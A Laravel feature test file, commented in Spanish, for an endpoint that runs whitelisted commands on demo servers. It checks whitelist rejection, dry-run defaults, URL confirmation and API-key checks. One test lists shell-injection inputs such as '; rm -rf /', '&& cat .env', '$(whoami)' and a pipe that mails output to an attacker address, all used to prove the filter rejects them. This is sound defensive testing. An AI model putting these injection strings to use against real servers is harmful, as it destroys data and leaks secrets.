<?php

namespace Tests\Feature;

use App\Models\Demo;
use App\Services\DemoCommandRunner;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Tests\TestCase;

/**
 * Los frenos de `POST claude/demo-commands`.
 *
 * Este endpoint ejecuta comandos en el servidor de una demo, así que lo que se protege acá es, en
 * orden de importancia:
 *
 *  1. 🔴 Que la LISTA BLANCA no se pueda esquivar. Un comando fuera de la lista, o un argumento con
 *     forma rara, tiene que rechazarse ANTES de abrir el SSH. Es lo único que separa esto de una
 *     shell remota.
 *  2. 🔴 Que el patrón de argumentos rechace inyección de shell: `;`, `&&`, backticks, `$(...)`,
 *     pipes y saltos de línea.
 *  3. Que `dry_run` sea true por defecto y no corra nada.
 *  4. Que `confirm_demo_name` sea exacto y que su error no revele la URL correcta.
 *
 * ⚠️ Los tests NO abren SSH: verifican que el rechazo ocurra antes. El camino feliz no se puede
 * probar sin un servidor de demo, y eso queda declarado en el informe en vez de simulado con un
 * mock que probaría el mock.
 */
class CorrerComandosEnUnaDemoPorClaudeTest extends TestCase
{
    use DatabaseTransactions;

    const CLAVE = 'clave-de-prueba-claude-demo-commands';
    const URL_DEMO = 'https://demo-de-comandos.comerciocity.com';

    protected function setUp(): void
    {
        parent::setUp();

        config(['services.claude_task_ingest.key' => self::CLAVE]);
    }

    /**
     * @return array<string, string>
     */
    private function headers(): array
    {
        return [
            'X-Claude-Task-Key' => self::CLAVE,
            'Accept'            => 'application/json',
        ];
    }

    /**
     * @return Demo
     */
    private function demo(): Demo
    {
        return Demo::create([
            'erp_spa_url'            => self::URL_DEMO,
            'erp_api_url'            => 'https://api-demo-de-comandos.comerciocity.com',
            'erp_hosting_type'       => 'vps',
            'ecommerce_spa_url'      => 'https://tienda-de-comandos.comerciocity.store',
            'ecommerce_api_url'      => 'https://api-tienda-de-comandos.comerciocity.store',
            'ecommerce_hosting_type' => 'vps',
        ]);
    }

    /* ------------------------------------------------------------------------------------------
     | 1. La lista blanca
     |----------------------------------------------------------------------------------------- */

    /**
     * 🔴 Un comando que no está en la lista se rechaza, y el 422 dice cuáles sí valen.
     *
     * @return void
     */
    public function test_rechaza_un_comando_fuera_de_la_lista_blanca(): void
    {
        $demo = $this->demo();

        $respuesta = $this->postJson('/api/claude/demo-commands', [
            'demo_id'           => $demo->id,
            'comando'           => 'migrate:fresh',
            'confirm_demo_name' => self::URL_DEMO,
            'dry_run'           => false,
        ], $this->headers());

        $respuesta->assertStatus(422);
        $respuesta->assertJsonStructure(['comandos_permitidos']);
    }

    /**
     * 🔴 Y se rechaza TAMBIÉN en dry run: el simulacro no puede decir que haría algo que nunca
     * haría.
     *
     * @return void
     */
    public function test_el_dry_run_tambien_rechaza_un_comando_prohibido(): void
    {
        $demo = $this->demo();

        $respuesta = $this->postJson('/api/claude/demo-commands', [
            'demo_id' => $demo->id,
            'comando' => 'migrate:fresh',
        ], $this->headers());

        $respuesta->assertStatus(422);
    }

    /**
     * 🔴 El patrón de argumentos rechaza todo intento de encadenar otra cosa.
     *
     * Se prueba contra el runner directamente, que es donde vive el freno: si alguna vez el
     * controlador deja de chequear, esta reja sigue en pie.
     *
     * @return void
     */
    public function test_los_argumentos_no_dejan_pasar_inyeccion_de_shell(): void
    {
        $runner = new DemoCommandRunner();
        $demo   = $this->demo();

        $intentos = [
            '--article_id=43; rm -rf /',
            '--article_id=43 && cat .env',
            '--article_id=`whoami`',
            '--article_id=$(whoami)',
            '--article_id=43 | mail atacante@example.com',
            "--article_id=43\nqueue:work",
            '--article_id=43 --otra-cosa',
            '; id',
        ];

        foreach ($intentos as $argumentos) {
            $tiro = false;

            try {
                $runner->run($demo, 'demo:sembrar-trazabilidad', $argumentos);
            } catch (\RuntimeException $e) {
                $tiro = true;
                /* Tiene que rechazar por la FORMA de los argumentos, no por no poder conectarse:
                   si el mensaje hablara del SSH querría decir que el argumento pasó el filtro y
                   llegó hasta la conexión. */
                $this->assertStringContainsString(
                    'argumentos',
                    $e->getMessage(),
                    'Rechazó "' . $argumentos . '", pero no por la forma de los argumentos: ' . $e->getMessage()
                );
            }

            $this->assertTrue($tiro, 'NO rechazó los argumentos: ' . $argumentos);
        }
    }

    /**
     * Los argumentos legítimos sí matchean el patrón (si no, el freno sería inútil por lo cerrado).
     *
     * @return void
     */
    public function test_los_argumentos_legitimos_matchean_el_patron(): void
    {
        $patron = DemoCommandRunner::COMANDOS_PERMITIDOS['demo:sembrar-trazabilidad'];

        $validos = [
            '',
            '--article_id=43',
            '--article_id=43 --user_id=400',
            '--article_id=43 --limpiar',
            '--article_id=43 --user_id=400 --limpiar',
        ];

        foreach ($validos as $argumentos) {
            $this->assertSame(
                1,
                preg_match($patron, $argumentos),
                'El patrón rechaza un argumento legítimo: "' . $argumentos . '"'
            );
        }
    }

    /**
     * Un comando sin argumentos no acepta ninguno: `queue:restart --force` no pasa.
     *
     * @return void
     */
    public function test_un_comando_sin_argumentos_no_acepta_ninguno(): void
    {
        $patron = DemoCommandRunner::COMANDOS_PERMITIDOS['queue:restart'];

        $this->assertSame(1, preg_match($patron, ''));
        $this->assertSame(0, preg_match($patron, '--force'));
        $this->assertSame(0, preg_match($patron, '; id'));
    }

    /**
     * 🔴 La credencial SSH sale del tipo de hosting de la demo, no se asume `shared_hosting`.
     *
     * La primera versión del runner hardcodeaba `shared_hosting`, y contra las tres demos reales
     * —que viven en VPS— el error que volvía era
     * `cd: /home/api-demo/empresa-api: No such file or directory`: la RUTA era la correcta, pero se
     * abría contra la máquina equivocada. El mensaje mandaba a mirar la ruta cuando el problema era
     * el servidor.
     *
     * @return void
     */
    public function test_la_credencial_sale_del_tipo_de_hosting_de_la_demo(): void
    {
        $resolver = new \App\Services\DemoPathResolver();

        $demo_vps = $this->demo();
        $this->assertSame('vps', $resolver->credential_type($demo_vps));

        $demo_compartido                    = $this->demo();
        $demo_compartido->erp_hosting_type  = 'shared_hosting';
        $this->assertSame('shared_hosting', $resolver->credential_type($demo_compartido));

        /* Y la reja de fondo: que el runner NO tenga el tipo escrito a mano. */
        $fuente = (string) file_get_contents(app_path('Services/DemoCommandRunner.php'));
        $this->assertStringContainsString('credential_type($demo)', $fuente);
        $this->assertStringNotContainsString("where('type', 'shared_hosting')", $fuente);
    }

    /* ------------------------------------------------------------------------------------------
     | 2. dry_run y el freno del nombre
     |----------------------------------------------------------------------------------------- */

    /**
     * 🔴 Por defecto simula: devuelve 200 con lo que haría y no corre nada.
     *
     * @return void
     */
    public function test_por_defecto_simula(): void
    {
        $demo = $this->demo();

        $respuesta = $this->postJson('/api/claude/demo-commands', [
            'demo_id'    => $demo->id,
            'comando'    => 'demo:sembrar-trazabilidad',
            'argumentos' => '--article_id=43',
        ], $this->headers());

        $respuesta->assertStatus(200);
        $respuesta->assertJsonPath('dry_run', true);
        $respuesta->assertJsonPath('se_haria.comando_completo', 'php artisan demo:sembrar-trazabilidad --article_id=43');
    }

    /**
     * 🔴 Con la URL equivocada rechaza, y el error NO revela la correcta.
     *
     * @return void
     */
    public function test_rechaza_si_la_url_no_confirma_y_no_la_revela(): void
    {
        $demo = $this->demo();

        $respuesta = $this->postJson('/api/claude/demo-commands', [
            'demo_id'           => $demo->id,
            'comando'           => 'queue:restart',
            'confirm_demo_name' => 'https://otra.comerciocity.com',
            'dry_run'           => false,
        ], $this->headers());

        $respuesta->assertStatus(422);
        $this->assertStringNotContainsString(self::URL_DEMO, (string) $respuesta->getContent());
    }

    /**
     * 🔴 Sin la clave de ingesta no contesta.
     *
     * @return void
     */
    public function test_sin_la_clave_no_contesta(): void
    {
        $demo = $this->demo();

        $this->postJson('/api/claude/demo-commands', [
            'demo_id' => $demo->id,
            'comando' => 'queue:restart',
        ], ['Accept' => 'application/json'])->assertStatus(401);
    }
}
